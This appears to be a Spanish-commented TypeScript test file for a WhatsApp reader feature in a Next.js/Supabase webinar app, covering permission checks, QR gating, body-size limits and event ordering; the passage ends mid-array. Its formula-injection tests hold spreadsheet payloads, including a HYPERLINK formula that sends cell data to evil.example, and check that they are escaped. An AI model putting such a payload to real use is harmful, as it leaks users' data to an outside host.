import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { createClient } from "@supabase/supabase-js";
import { GET as getEstado } from "@/app/api/whatsapp/estado/route";
import { GET as getWebinar, POST as postWebinar } from "@/app/api/whatsapp/webinar/route";
import { exigirArea } from "@/lib/permisos-servidor";
import * as servidor from "@/lib/whatsapp-servidor";
import { RepoMemoria, recibirGrupo, recibirLatido, responderEstado, leerJson, type DepsDeEstado } from "@/lib/whatsapp-servidor";
import * as WA from "@/lib/whatsapp";
import { aplicarAviso, listaParaCopiar, validarCuerpoGrupo, type MiembroWhatsapp } from "@/lib/whatsapp";
import { TIPOS_POR_DEFECTO, type MiAcceso } from "@/lib/permisos";

/* ==================================================================
   Arreglos del estrés, lado de la app de WhatsApp. Cada prueba falla con el código de antes (b69dd22) y pasa
   con el de ahora. Lo nuevo se pide por el espacio de nombres (`WA.x`, `servidor.x`) para que, contra el código
   viejo, cada prueba falle sola y no se caiga el archivo entero por una importación que no existe.
   ================================================================== */

const QR = `data:image/svg+xml;base64,${Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"/>').toString("base64")}`;
const G = "120363025246125486@g.us";
const A = "5491100000001", B = "5491100000002", C = "5491100000003";
const json = (cuerpo: unknown, status = 200) => new Response(JSON.stringify(cuerpo), { status, headers: { "content-type": "application/json" } });
const falla = (status: number, cuerpo: object) => () => json(cuerpo, status);

/* ---------- un PostgREST de mentira ---------- */

type Respuesta = Response | (() => Response);
/** Quién pide, qué contesta cada pregunta de permisos y qué se preguntó. `nivel_area:<área>` y `solo_lo_suyo`, `whatsapp_qr_vigente`,
    `puede_entrar`: cada una puede ser un valor (se contesta 200) o una función que arma la respuesta (un error, o tira para cortar la red). */
function postgrest(reglas: Record<string, unknown | (() => Response)>) {
  const llamadas: string[] = [];
  const antes = globalThis.fetch;
  globalThis.fetch = (async (entrada: RequestInfo | URL, init?: RequestInit) => {
    const url = String(typeof entrada === "string" ? entrada : entrada instanceof URL ? entrada.href : entrada.url);
    const ruta = /\/rest\/v1\/rpc\/([\w]+)/.exec(url)?.[1];
    if (!ruta) throw new Error(`fetch inesperado: ${url}`);
    const clave = ruta === "nivel_area" ? `nivel_area:${JSON.parse(String(init?.body)).area}` : ruta;
    llamadas.push(clave);
    const r = reglas[clave];
    if (r === undefined) throw new Error(`pregunta no prevista: ${clave}`);
    if (typeof r === "function") return (r as () => Response)();
    return json(r);
  }) as typeof fetch;
  return { llamadas, restaurar: () => { globalThis.fetch = antes; } };
}

async function conEquipo<T>(f: () => Promise<T>): Promise<T> {
  const previo = [process.env.NEXT_PUBLIC_SUPABASE_URL, process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY];
  process.env.NEXT_PUBLIC_SUPABASE_URL = "https://ejemplo.supabase.co";
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY = "anon-de-mentira";
  try { return await f(); } finally {
    if (previo[0] === undefined) delete process.env.NEXT_PUBLIC_SUPABASE_URL; else process.env.NEXT_PUBLIC_SUPABASE_URL = previo[0];
    if (previo[1] === undefined) delete process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY; else process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY = previo[1];
  }
}

const conSesion = (url: string, init: RequestInit = {}) => new Request(url, { ...init, headers: { authorization: "Bearer jwt-de-prueba", ...(init.headers as object) } });

/* El estado de verdad (responderEstado y exigirArea REALES): sólo la base y el repositorio son de mentira. */
async function pedirEstado(reglas: Record<string, unknown | (() => Response)>, opciones: { query?: string; hace?: number } = {}) {
  const pg = postgrest(reglas);
  try {
    return await conEquipo(async () => {
      const repo = new RepoMemoria();
      await recibirLatido(repo, { en: new Date().toISOString(), conectado: false, estado: "esperando_qr", grupos: 1, qr: QR });
      await repo.guardarGrupo({ id: G, nombre: "Grupo 1" });
      const deps: DepsDeEstado = {
        exigirArea, repositorio: () => ({ repo, modo: "nube" }), ahora: () => new Date(),
        ...((servidor as Record<string, unknown>).qrVigenteDelPedido ? { qrVigente: (servidor as unknown as { qrVigenteDelPedido: DepsDeEstado["qrVigente"] }).qrVigenteDelPedido } : {}),
      };
      const r = await responderEstado(conSesion(`http://localhost/api/whatsapp/estado${opciones.query ?? "?qr=1"}`), deps);
      return { status: r.status, cuerpo: (await r.json()) as Record<string, any>, llamadas: pg.llamadas };
    });
  } finally { pg.restaurar(); }
}

/* Marketing: ve y edita Webinars, no tiene nada de Ajustes. */
const MARKETING = { puede_entrar: true, "nivel_area:webinars": 2, "nivel_area:ajustes": 0, solo_lo_suyo: false, whatsapp_qr_vigente: null };
/* Un dueño. */
const DUENO = { puede_entrar: true, "nivel_area:webinars": 2, "nivel_area:ajustes": 2, solo_lo_suyo: false, whatsapp_qr_vigente: QR };

/* ---------- 1. el código QR falla cerrado ---------- */

const FALLAS: [string, () => Response][] = [
  ["JWT vencido entre una pregunta y la otra (401 PGRST303)", falla(401, { code: "PGRST303", message: "JWT expired", details: null, hint: null })],
  ["Supabase contesta 429", falla(429, { message: "Too many requests" })],
  ["Supabase contesta 503", falla(503, { message: "Service Unavailable" })],
  ["se corta la red", () => { throw new TypeError("fetch failed"); }],
];

for (const [nombre, f] of FALLAS) {
  test(`el código no sale si la pregunta por Ajustes falla: ${nombre}`, async () => {
    const r = await pedirEstado({ ...MARKETING, "nivel_area:ajustes": f });
    assert.equal(r.status, 503, "no se pudo comprobar el permiso: se dice, no se calla con un 403");
    assert.ok(!r.cuerpo.qr && !r.cuerpo.puedeVerQr, "sin código");
    assert.ok(!JSON.stringify(r.cuerpo).includes("base64"), "el código no viaja de ninguna manera");
  });

  test(`la pregunta de permisos que falla cierra la puerta (exigirArea real): ${nombre}`, async () => {
    const pg = postgrest({ puede_entrar: true, "nivel_area:ajustes": f });
    try {
      const r = await conEquipo(() => exigirArea(conSesion("http://localhost/x"), ["ajustes"], 2));
      assert.ok(r, "no deja pasar");
      assert.equal(r!.status, 503, "no se pudo comprobar: 503 (reintentá), no «tu tipo de cuenta no ve esto»");
      const lectura = await conEquipo(() => exigirArea(conSesion("http://localhost/x"), ["ajustes"], 1));
      assert.equal(lectura?.status, 503, "tampoco para ver");
    } finally { pg.restaurar(); }
  });
}

test("un dueño recibe el código, pidiéndoselo a la base con su sesión (una llamada: la base decide)", async () => {
  const r = await pedirEstado(DUENO);
  assert.deepEqual([r.cuerpo.puedeVerQr, r.cuerpo.qr], [true, QR]);
  assert.ok(r.llamadas.includes("whatsapp_qr_vigente"), "pregunta por whatsapp_qr_vigente()");
});

test("si la función del código falla (JWT vencido, 429, 503, red), la respuesta es «sin código»", async () => {
  for (const [nombre, f] of FALLAS) {
    const r = await pedirEstado({ ...DUENO, whatsapp_qr_vigente: f });
    assert.equal(r.status, 200, nombre);
    assert.deepEqual([r.cuerpo.puedeVerQr, r.cuerpo.qr], [true, null], nombre);
  }
});

test("si la base todavía no tiene whatsapp_qr_vigente() (falta el SQL nuevo), el dueño sigue recibiendo el código como antes", async () => {
  const r = await pedirEstado({ ...DUENO, whatsapp_qr_vigente: falla(404, { code: "PGRST202", message: "Could not find the function public.whatsapp_qr_vigente without parameters in the schema cache" }) });
  assert.deepEqual([r.cuerpo.puedeVerQr, r.cuerpo.qr], [true, QR]);
});

test("sin tipos-cuenta.sql (no existe nivel_area) se mantiene lo de antes: el que entra, entra", async () => {
  const noExiste = falla(404, { code: "PGRST202", message: "Could not find the function public.nivel_area(area) in the schema cache" });
  const r = await pedirEstado({ puede_entrar: true, "nivel_area:webinars": noExiste, "nivel_area:ajustes": noExiste, solo_lo_suyo: noExiste, whatsapp_qr_vigente: noExiste });
  assert.equal(r.status, 200);
  assert.deepEqual([r.cuerpo.puedeVerQr, r.cuerpo.qr], [true, QR]);
  const noExiste42883 = falla(404, { code: "42883", message: "function public.nivel_area(text) does not exist" });
  const pg = postgrest({ puede_entrar: true, "nivel_area:ajustes": noExiste42883 });
  try { assert.equal(await conEquipo(() => exigirArea(conSesion("http://localhost/x"), ["ajustes"], 2)), null); } finally { pg.restaurar(); }
});

test("sin sesión o sin ser del equipo: 401 y ni se pregunta por el nivel", async () => {
  const pg = postgrest({ puede_entrar: false });
  try {
    const r = await conEquipo(() => exigirArea(conSesion("http://localhost/x"), ["ajustes"], 2));
    assert.equal(r?.status, 401);
    assert.deepEqual(pg.llamadas, ["puede_entrar"]);
    assert.equal((await conEquipo(() => exigirArea(new Request("http://localhost/x"), ["ajustes"], 2)))?.status, 401);
  } finally { pg.restaurar(); }
});

test("quien edita Ajustes pero no ve los Webinars recibe el estado y el código, sin los grupos (una sola regla para el código)", async () => {
  const r = await pedirEstado({ ...DUENO, "nivel_area:webinars": 0 });
  assert.equal(r.status, 200);
  assert.deepEqual([r.cuerpo.puedeVerQr, r.cuerpo.qr, r.cuerpo.sinGrupos, r.cuerpo.grupos], [true, QR, true, []]);
  /* Y si no pide el código, no recibe nada: el estado es de quien ve los Webinars. */
  assert.equal((await pedirEstado({ ...DUENO, "nivel_area:webinars": 0 }, { query: "" })).status, 403);
  /* Ni ve los Webinars ni edita Ajustes: 403, sin código. */
  const nada = await pedirEstado({ ...MARKETING, "nivel_area:webinars": 0 });
  assert.equal(nada.status, 403);
  assert.ok(!JSON.stringify(nada.cuerpo).includes("base64"));
});

test("sin equipo configurado, en la nube el código no sale; en la prueba local sí", async () => {
  const previo = [process.env.NEXT_PUBLIC_SUPABASE_URL, process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY];
  delete process.env.NEXT_PUBLIC_SUPABASE_URL; delete process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
  try {
    for (const modo of ["nube", "prueba-local"] as const) {
      const repo = new RepoMemoria();
      await recibirLatido(repo, { en: new Date().toISOString(), conectado: false, estado: "esperando_qr", grupos: 0, qr: QR });
      const r = await responderEstado(new Request("http://localhost/api/whatsapp/estado?qr=1"), { exigirArea, repositorio: () => ({ repo, modo }), ahora: () => new Date() });
      const cuerpo = (await r.json()) as Record<string, any>;
      /* En la nube, sin equipo configurado la puerta entera falla cerrada (401, ni estado ni código); en la prueba local sigue abierta. */
      if (modo === "nube") { assert.equal(r.status, 401, modo); assert.ok(!cuerpo.qr, modo); }
      else assert.equal(cuerpo.qr, QR, modo);
    }
  } finally {
    if (previo[0] !== undefined) process.env.NEXT_PUBLIC_SUPABASE_URL = previo[0];
    if (previo[1] !== undefined) process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY = previo[1];
  }
});

/* ---------- 3. «sólo lo suyo» ---------- */

test("«sólo lo suyo» con Webinars en «ver» no recibe el estado ni los teléfonos: 403", async () => {
  const r = await pedirEstado({ ...MARKETING, "nivel_area:webinars": 1, solo_lo_suyo: true }, { query: "" });
  assert.equal(r.status, 403);
  assert.ok(!JSON.stringify(r.cuerpo).includes("Grupo 1"));
  /* La ruta de verdad. */
  const pg = postgrest({ ...MARKETING, "nivel_area:webinars": 1, solo_lo_suyo: true });
  try {
    await conEquipo(async () => {
      const w = await getWebinar(conSesion("http://localhost/api/whatsapp/webinar?id=w1"));
      assert.equal(w.status, 403);
      const e = await getEstado(conSesion("http://localhost/api/whatsapp/estado"));
      assert.equal(e.status, 403);
    });
  } finally { pg.restaurar(); }
});

test("quien no es «sólo lo suyo» pasa igual que antes (la ruta llega a pedir la base: 503 sin clave de servicio)", async () => {
  const pg = postgrest(MARKETING);
  try {
    await conEquipo(async () => {
      const w = await getWebinar(conSesion("http://localhost/api/whatsapp/webinar?id=w1"));
      assert.equal(w.status, 503, "pasó la puerta");
      assert.ok(pg.llamadas.includes("solo_lo_suyo"));
    });
  } finally { pg.restaurar(); }
});

test("«sólo lo suyo»: si la pregunta falla no se deja pasar (503, reintentá); sin la función (base vieja) no hay «sólo lo suyo»", async () => {
  for (const [nombre, f] of FALLAS) {
    const pg = postgrest({ ...MARKETING, solo_lo_suyo: f });
    try { assert.equal((await conEquipo(() => exigirArea(conSesion("http://localhost/x"), ["webinars"], 1, { sinSoloLoSuyo: true })))?.status, 503, nombre); } finally { pg.restaurar(); }
  }
  /* Y si la base contesta que sí es «sólo lo suyo», es un 403 firme. */
  const firme = postgrest({ ...MARKETING, solo_lo_suyo: true });
  try { assert.equal((await conEquipo(() => exigirArea(conSesion("http://localhost/x"), ["webinars"], 1, { sinSoloLoSuyo: true })))?.status, 403); } finally { firme.restaurar(); }
  const pg = postgrest({ ...MARKETING, solo_lo_suyo: falla(404, { code: "PGRST202", message: "Could not find the function public.solo_lo_suyo without parameters" }) });
  try { assert.equal(await conEquipo(() => exigirArea(conSesion("http://localhost/x"), ["webinars"], 1, { sinSoloLoSuyo: true })), null); } finally { pg.restaurar(); }
});

test("el SQL nuevo: las tres políticas piden «no sólo lo suyo», la función del código es de quien edita Ajustes y anon no la ejecuta", () => {
  const sql = readFileSync(new URL("../supabase/whatsapp-lector-permisos.sql", import.meta.url), "utf8");
  for (const t of ["whatsapp_lector", "whatsapp_grupos", "whatsapp_miembros"]) {
    assert.match(sql, new RegExp(`drop policy if exists ver_${t} on public\\.${t};`));
    assert.match(sql, new RegExp(`create policy ver_${t} on public\\.${t}[\\s\\S]*?nivel_area\\('webinars'\\)\\) >= 1 and \\(select not public\\.solo_lo_suyo\\(\\)\\)\\);`));
  }
  assert.match(sql, /create or replace function public\.whatsapp_qr_vigente\(\)/);
  assert.match(sql, /nivel_area\('ajustes'\) >= 2/);
  assert.match(sql, /interval '60 seconds'/);
  assert.match(sql, /revoke execute on function public\.whatsapp_qr_vigente\(\) from public, anon;/);
  assert.match(sql, /grant execute on function public\.whatsapp_qr_vigente\(\) to authenticated;/);
  assert.ok(!/drop table|delete from|truncate/i.test(sql), "no borra nada");
});

/* ---------- 4. inyección de fórmulas ---------- */

test("«Con nombres» no deja pasar una fórmula a la planilla", () => {
  for (const peligroso of ['=HYPERLINK("https://evil.example/?d="&B1:B500,"Ver")', "@SUM(1+1)", "+1+1", "-2+3", "=1+1", "\t=1+1", " =1+1", " =1+1"]) {
    const salida = listaParaCopiar([{ nombre: peligroso, numero: "5491155551234", completo: true }], true);
    const celda = salida.split("\t")[0];
    assert.ok(celda.startsWith("'"), `«${peligroso}» queda como texto: ${celda}`);
    assert.ok(salida.endsWith("\t+5491155551234"), "el teléfono sigue igual");
  }
});

test("los nombres de verdad no se tocan", () => {
  const nombres = ["Jean-Paul", "María", "Ana Pérez", "O'Brien", "José María del Carmen", "李雷", "Mc-Donald", "A+B"];
  const filas = nombres.map((nombre, i) => ({ nombre, numero: `54911555500${i}`, completo: true }));
  assert.equal(listaParaCopiar(filas, true), filas.map((f) => `${f.nombre}\t+${f.numero}`).join("\n"));
  /* Sin nombres no hay nada que escapar. */
  assert.equal(listaParaCopiar([{ nombre: "=1+1", numero: "5491155551234", completo: true }], false), "+5491155551234");
});

test("el nombre se sanea al guardarlo: sin = + - @ al principio, y «Jean-Paul» y «María» quedan", () => {
  const limpiar = (WA as unknown as { nombreSinFormula: (n: string | undefined) => string | undefined }).nombreSinFormula;
  assert.equal(typeof limpiar, "function");
  assert.equal(limpiar('=HYPERLINK("https://evil.example","x")'), 'HYPERLINK(\u201dhttps://evil.example\u201d,\u201dx\u201d)', "sin comillas rectas");
  assert.equal(limpiar("@SUM(1+1)"), "SUM(1+1)");
  assert.equal(limpiar("  +-=@ Ana"), "Ana");
  assert.equal(limpiar("\t=1+1"), "1+1");
  assert.equal(limpiar("Jean-Paul"), "Jean-Paul");
  assert.equal(limpiar("María"), "María");
  assert.equal(limpiar("Ana\nPérez"), "Ana Pérez");
  assert.equal(limpiar("==="), undefined, "si no queda nada, es como si no hubiera escrito nombre");
  assert.equal(limpiar(undefined), undefined);
  const ruta = readFileSync(new URL("../src/app/api/webinar/registro/route.ts", import.meta.url), "utf8");
  assert.match(ruta, /nombreSinFormula\(primero\(d, CAMPOS_NOMBRE\)\)/, "la ruta pública lo usa");
});

/* ---------- 7. cuerpos grandes ---------- */

/** Un cuerpo en partes, sin Content-Length, que cuenta cuántas partes se le pidieron. */
function cuerpoEnPartes(partes: number, tamano: number) {
  const estado = { pedidas: 0 };
  const cuerpo = new ReadableStream<Uint8Array>({
    pull(c) {
      if (estado.pedidas >= partes) { c.close(); return; }
      estado.pedidas++;
      c.enqueue(new Uint8Array(tamano).fill(0x61));
    },
  }, { highWaterMark: 0 }); // sin leer por adelantado: sólo se pide lo que alguien lee
  return { estado, cuerpo };
}
const pedidoEnPartes = (cuerpo: ReadableStream<Uint8Array>, headers: Record<string, string> = {}) =>
  new Request("http://localhost/api/whatsapp/webinar", { method: "POST", body: cuerpo, headers, duplex: "half" } as RequestInit);

test("un cuerpo en partes (sin Content-Length) se corta apenas pasa el máximo, sin leerlo entero", async () => {
  const { estado, cuerpo } = cuerpoEnPartes(2000, 1024); // 2 MB en total
  const r = await leerJson(pedidoEnPartes(cuerpo), 10_000);
  assert.deepEqual([r.ok, r.ok ? 0 : r.status], [false, 413]);
  assert.ok(estado.pedidas < 100, `se pidieron ${estado.pedidas} partes de 2000: se cortó a tiempo`);
});

test("el tope se mide en bytes, y un cuerpo justo en el máximo pasa", async () => {
  const exacto = `{"a":"${"x".repeat(10_000 - 8)}"}`;
  assert.equal(new TextEncoder().encode(exacto).length, 10_000);
  const bien = await leerJson(new Request("http://localhost/x", { method: "POST", body: exacto }), 10_000);
  assert.equal(bien.ok, true);
  const mal = await leerJson(new Request("http://localhost/x", { method: "POST", body: exacto + " " }), 10_000);
  assert.deepEqual([mal.ok, mal.ok ? 0 : mal.status], [false, 413]);
  /* Con acentos, 6.000 letras son 12.000 bytes: pasa de 10 KB. */
  const acentos = await leerJson(new Request("http://localhost/x", { method: "POST", body: JSON.stringify({ a: "é".repeat(6000) }) }), 10_000);
  assert.deepEqual([acentos.ok, acentos.ok ? 0 : acentos.status], [false, 413]);
  /* Lo de siempre: sin cuerpo y JSON roto son 400. */
  const vacio = await leerJson(new Request("http://localhost/x", { method: "POST" }), 10_000);
  assert.deepEqual([vacio.ok, vacio.ok ? 0 : vacio.status], [false, 400]);
  const roto = await leerJson(new Request("http://localhost/x", { method: "POST", body: "{no" }), 10_000);
  assert.deepEqual([roto.ok, roto.ok ? 0 : roto.status], [false, 400]);
});

test("POST /api/whatsapp/webinar pide el permiso ANTES de leer el cuerpo", async () => {
  const pg = postgrest({ puede_entrar: false });
  try {
    await conEquipo(async () => {
      const { estado, cuerpo } = cuerpoEnPartes(50, 1024);
      const r = await postWebinar(pedidoEnPartes(cuerpo));
      assert.equal(r.status, 401, "sin sesión: 401, no 400 ni 413");
      assert.equal(estado.pedidas, 0, "no se leyó ni una parte del cuerpo");
    });
  } finally { pg.restaurar(); }
  /* Con permiso, el cuerpo se lee y se valida como siempre. */
  const pg2 = postgrest({ puede_entrar: true, "nivel_area:webinars": 2 });
  try {
    await conEquipo(async () => {
      const enorme = await postWebinar(conSesion("http://localhost/api/whatsapp/webinar", { method: "POST", body: "x".repeat(20_000) }));
      assert.equal(enorme.status, 413);
      const malo = await postWebinar(conSesion("http://localhost/api/whatsapp/webinar", { method: "POST", body: JSON.stringify({ accion: "otra" }) }));
      assert.equal(malo.status, 400);
    });
  } finally { pg2.restaurar(); }
});

/* ---------- 8. el orden de los avisos ---------- */

const T = (min: number) => new Date(Date.UTC(2026, 9, 7, 18, 0, 0) + min * 60_000).toISOString();
const miembro = (telefono: string, extra: Partial<MiembroWhatsapp> = {}): MiembroWhatsapp => ({ grupoId: G, telefono, dentro: true, entro: null, salio: null, creadoEn: T(-100), ...extra });
const aplicar = (existentes: MiembroWhatsapp[], cambios: ReturnType<typeof aplicarAviso>) => {
  const mapa = new Map(existentes.map((m) => [m.telefono, m] as const));
  for (const m of [...cambios.crear, ...cambios.actualizar]) mapa.set(m.telefono, m);
  return mapa;
};

test("un «entró» de alguien que ya está adentro sube `entro`, así un «salió» más viejo que llega tarde no lo saca", () => {
  let filas = [miembro(B)]; // venía en la primera foto: sin hora de entrada
  filas = [...aplicar(filas, aplicarAviso(filas, "entro", [B], T(18), G)).values()];
  assert.equal(filas[0].entro, T(18), "queda la hora del aviso");
  assert.equal(filas[0].dentro, true);
  const tarde = aplicarAviso(filas, "salio", [B], T(16), G); // el reintento tardío
  assert.equal(tarde.salieron, 0);
  assert.equal(aplicar(filas, tarde).get(B)!.dentro, true, "B sigue adentro");
});

test("un «salió» de alguien nunca visto deja su fila (afuera): un «entró» más viejo que llega después no lo mete", () => {
  const salio = aplicarAviso([], "salio", [C], T(16), G);
  assert.deepEqual(salio.crear.map((m) => [m.telefono, m.dentro, m.entro, m.salio]), [[C, false, null, T(16)]]);
  assert.equal(salio.salieron, 0, "no se cuenta como alguien que salió: nunca lo vimos adentro");
  const filas = [...aplicar([], salio).values()];
  const entro = aplicarAviso(filas, "entro", [C], T(14), G);
  assert.equal(entro.volvieron, 0);
  const final = aplicar(filas, entro).get(C)!;
  assert.deepEqual([final.dentro, final.entro, final.salio], [false, T(14), T(16)], "sigue afuera, y deja la hora");
});

test("las horas sólo suben: un aviso más viejo no las baja", () => {
  const filas = [miembro(A, { dentro: false, entro: T(10), salio: T(20) })];
  const viejoSalio = aplicarAviso(filas, "salio", [A], T(5), G);
  assert.equal(viejoSalio.actualizar.length, 0, "ya sabía algo más nuevo");
  const viejoEntro = aplicarAviso(filas, "entro", [A], T(5), G);
  assert.equal(viejoEntro.actualizar.length, 0);
  /* Lo mismo con el mismo instante. */
  assert.equal(aplicarAviso(filas, "salio", [A], T(20), G).actualizar.length, 0);
});

test("de punta a punta por el servidor: entró, salió fuera de orden, y el que nunca vimos", async () => {
  const repo = new RepoMemoria();
  const cuerpo = (evento: "foto" | "entro" | "salio", telefonos: string[], en: string) => {
    const v = validarCuerpoGrupo({ grupo: { id: G, nombre: "Taller" }, evento, participantes: telefonos, en });
    assert.ok(v.ok);
    return v.ok ? v.valor : (undefined as never);
  };
  /* Un aviso de la hora de ahora, para que no lo tome por reloj desfasado. */
  const ahora = Date.now();
  const iso = (seg: number) => new Date(ahora + seg * 1000).toISOString();
  await recibirGrupo(repo, cuerpo("foto", [A, B], iso(-600)));
  await recibirGrupo(repo, cuerpo("entro", [B], iso(-18)));
  await recibirGrupo(repo, cuerpo("salio", [B], iso(-20)));
  await recibirGrupo(repo, cuerpo("salio", [C], iso(-16)));
  await recibirGrupo(repo, cuerpo("entro", [C], iso(-20))); // el «entró» más viejo, que llega después
  const filas = new Map((await repo.leerMiembros(G)).map((m) => [m.telefono, m] as const));
  assert.equal(filas.get(B)!.dentro, true, "B sigue adentro");
  assert.equal(filas.get(C)!.dentro, false, "C sigue afuera");
  assert.equal((await repo.contarDentro(G)), 2, "A y B");
});

/* ---------- 9. los teléfonos no van en la dirección ---------- */

test("buscar miembros por teléfono no escribe los teléfonos en la URL de la API", async () => {
  const todos = Array.from({ length: 1001 }, (_, i) => ({ grupoId: G, telefono: `549110${String(i).padStart(7, "0")}`, dentro: true, entro: null, salio: null }));
  const urls: string[] = [];
  const falso = (async (entrada: RequestInfo | URL, init?: RequestInit) => {
    const u = new URL(String(typeof entrada === "string" ? entrada : entrada instanceof URL ? entrada.href : entrada.url));
    urls.push(u.href + (init?.body ? ` ${String(init.body)}` : ""));
    const desde = Number(u.searchParams.get("offset") ?? 0);
    const limite = Number(u.searchParams.get("limit") ?? 1000);
    return new Response(JSON.stringify(todos.slice(desde, desde + limite)), { status: 200, headers: { "content-type": "application/json" } });
  }) as typeof fetch;
  const RepoSupabase = (servidor as unknown as { RepoSupabase?: new (db: unknown) => servidor.RepoWhatsapp }).RepoSupabase;
  assert.ok(RepoSupabase, "el repositorio de Supabase se puede probar");
  const repo = new RepoSupabase!(createClient("https://ejemplo.supabase.co", "clave", { auth: { persistSession: false }, global: { fetch: falso } }));
  const buscados = [todos[3].telefono, todos[1000].telefono, "5491199999999"];
  const filas = await repo.leerMiembros(G, buscados);
  assert.deepEqual(filas.map((f) => f.telefono).sort(), [todos[3].telefono, todos[1000].telefono].sort(), "filtra en memoria, también la segunda página");
  assert.ok(urls.length >= 2, "pidió por páginas");
  for (const u of urls) {
    assert.ok(!/telefono=in\./.test(u), `sin filtro por teléfono en la URL: ${u}`);
    for (const t of buscados) assert.ok(!u.includes(t), `el teléfono ${t.slice(0, 5)}… no está en ${u}`);
  }
  /* Sin lista de teléfonos, el grupo entero como siempre. */
  assert.equal((await repo.leerMiembros(G)).length, 1001);
});

/* ---------- 2, 5 y 6. una sola regla, y la pantalla según el permiso ---------- */

const acceso = (areas: MiAcceso["areas"], soloLoSuyo = false, tipo = "x"): MiAcceso => ({ tipo, nombre: tipo, areas, soloLoSuyo });
const porDefecto = (id: string): MiAcceso => { const t = TIPOS_POR_DEFECTO.find((x) => x.id === id)!; return { tipo: t.id, nombre: t.nombre, areas: t.areas, soloLoSuyo: t.soloLoSuyo }; };

test("quién ve el estado del lector y quién puede vincular el número", () => {
  const ve = (WA as unknown as { puedeVerWhatsapp: (a: MiAcceso | null) => boolean }).puedeVerWhatsapp;
  const vincula = (WA as unknown as { puedeVincularWhatsapp: (a: MiAcceso | null) => boolean }).puedeVincularWhatsapp;
  assert.equal(typeof ve, "function");
  const casos: [string, MiAcceso | null, boolean, boolean][] = [
    ["dueño", porDefecto("dueno"), true, true],
    ["todo menos honorarios", porDefecto("equipo"), true, true],
    ["director comercial (Webinars en ver)", porDefecto("director"), true, false],
    ["marketing (Webinars en editar, sin Ajustes)", porDefecto("marketing"), true, false],
    ["closer (sólo lo suyo)", porDefecto("closer"), false, false],
    ["administración", porDefecto("admin"), false, false],
    ["sólo edita Ajustes", acceso({ ajustes: "editar" }), false, true],
    ["Ajustes en ver", acceso({ ajustes: "ver", webinars: "ver" }), true, false],
    ["sólo lo suyo con Webinars en ver", acceso({ crm: "editar", webinars: "ver" }, true), false, false],
    ["sin sesión", null, false, false],
  ];
  for (const [nombre, a, esperadoVe, esperadoVincula] of casos) {
    assert.equal(ve(a), esperadoVe, `${nombre}: ve`);
    assert.equal(vincula(a), esperadoVincula, `${nombre}: vincula`);
  }
});

test("la pantalla de Ajustes: el código vence en ~60 s sin respuesta buena, y tras un 403 no vuelve a preguntar", () => {
  const vencido = (WA as unknown as { sinCodigoVencido: (d: unknown, recibido: number, ahora: number) => { qr?: string | null } | null }).sinCodigoVencido;
  const proxima = (WA as unknown as { proximaPregunta: (sinAcceso: boolean, conectado: boolean) => number | null }).proximaPregunta;
  assert.equal(typeof vencido, "function");
  const datos = { configurado: true, tablas: true, modo: "nube", lector: null, grupos: [], puedeVerQr: true, qr: QR };
  assert.equal(vencido(datos, 1000, 1000 + 59_999)?.qr, QR, "a los 59,9 s todavía vale");
  assert.equal(vencido(datos, 1000, 1000 + 60_000)?.qr, null, "a los 60 s se saca");
  assert.equal(vencido(datos, 1000, 1000 + 600_000)?.qr, null);
  assert.equal(vencido(datos, 1000, 1000 + 600_000) && (vencido(datos, 1000, 1000 + 600_000) as { puedeVerQr?: boolean }).puedeVerQr, true, "el resto de la respuesta queda");
  assert.equal(vencido({ ...datos, qr: null }, 1000, 1000 + 600_000)?.qr, null);
  assert.equal(vencido(null, 0, 1e9), null);
  /* Cuándo vuelve a preguntar. */
  assert.equal(typeof proxima, "function");
  assert.equal(proxima(false, false), 3_500);
  assert.equal(proxima(false, true), 20_000);
  assert.equal(proxima(true, false), null, "tras un 401 o 403 no insiste");
  assert.equal(proxima(true, true), null);
});

test("las pantallas mandan a Ajustes → WhatsApp sólo a quien edita Ajustes, y a los demás les dicen que avisen a un dueño", () => {
  const leer = (ruta: string) => readFileSync(new URL(`../${ruta}`, import.meta.url), "utf8");
  const aviso = leer("src/components/webinars/AvisoLectorWhatsapp.tsx");
  assert.match(aviso, /puedeVincularWhatsapp\(acceso\)/);
  assert.match(aviso, /\{puedeVincular && <Link href="\/ajustes\?seccion=whatsapp"/, "el botón sólo si puede");
  assert.match(aviso, /avisale a un dueño/i);
  assert.match(aviso, /puedeVerWhatsapp\(acceso\)/, "y no se muestra a quien ve sólo lo suyo");

  const grupo = leer("src/components/webinars/GrupoWhatsapp.tsx");
  assert.match(grupo, /puedeVincular \? <Link href="\/ajustes\?seccion=whatsapp"/, "«Ver cómo se conecta» sólo si puede");
  assert.match(grupo, /lo ata quien edita los Webinars/i, "para quien no puede atar, dice quién lo hace");

  const formularios = leer("src/components/formularios/LectorFormularios.tsx");
  assert.match(formularios, /puedeEditar\s*\? <Link href=\{`\/webinars\//, "«Atarlo en la ficha» sólo si puede atar");
  assert.match(formularios, /Lo ata quien edita los Webinars: avisale a un dueño/);

  const ajustes = leer("src/components/ajustes/WhatsappLector.tsx");
  assert.match(ajustes, /datos\.sinGrupos/, "Ajustes sabe que quien sólo edita Ajustes no ve los grupos");
  assert.match(ajustes, /l\.error && \(/, "el error de red se muestra aunque haya datos viejos");
});

/* ==================================================================
   Ronda 2: lo que encontró el verificador.
   ================================================================== */

/** Una planilla pegando texto tabulado con la comilla como calificador (la convención de CSV/TSV que siguen Excel
    y Google Sheets): un campo que empieza con " va hasta la próxima " suelta, y "" adentro es una comilla. */
function pegarEnPlanilla(texto: string): string[][] {
  const filas: string[][] = [[]];
  let campo = "";
  let i = 0;
  const cerrarCampo = () => { filas[filas.length - 1].push(campo); campo = ""; };
  while (i < texto.length) {
    if (campo === "" && texto[i] === '"') {
      i++;
      for (; i < texto.length; i++) {
        if (texto[i] === '"') { if (texto[i + 1] === '"') { campo += '"'; i++; } else { i++; break; } } else campo += texto[i];
      }
    } else if (texto[i] === "\t") { cerrarCampo(); i++; }
    else if (texto[i] === "\n") { cerrarCampo(); filas.push([]); i++; }
    else campo += texto[i++];
  }
  cerrarCampo();
  return filas;
}

const NOMBRES_CON_COMILLAS = [
